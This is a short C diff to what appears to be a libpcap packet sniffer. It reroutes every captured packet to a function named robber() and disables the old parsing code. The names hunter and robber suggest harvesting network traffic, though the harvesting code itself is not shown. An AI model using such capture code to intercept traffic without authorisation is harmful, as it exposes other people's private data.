@@ -15,10 +15,12 @@ pthread_t       hunter                          = 0;
 
 
 void
-packet_dispatch(    u_char                      *userarg,   // callback args
-                    const struct pcap_pkthdr    *pkthdr,    // packet info
-                    const u_char                *packet)    // packet buf
+packet_catcher( u_char                      *userarg,   // callback args
+                const struct pcap_pkthdr    *pkthdr,    // packet info
+                const u_char                *packet)    // packet buf
 {
+    robber(packet, pkthdr->len);
+#if 0
     struct _ethhdr      *eth        = (struct _ethhdr*)packet;
     struct hostent      *hi          = 0;
 
@@ -82,6 +84,7 @@ packet_dispatch(    u_char                      *userarg,   // callback args
     // memcpy(p, packet, pi.size);
 
     // thread_sender((void*)&pi);return;
+#endif
 }
 
 
@@ -89,7 +92,7 @@ void*
 hunter_loop_thread(void* args)
 {
     _MESSAGE_OUT("[+] hunter start!\n");
-    pcap_loop(pd, -1, packet_dispatch, 0);
+    pcap_loop(pd, -1, packet_catcher, 0);
     _MESSAGE_OUT("[-] hunter stop!\n");
     return 0;
 }
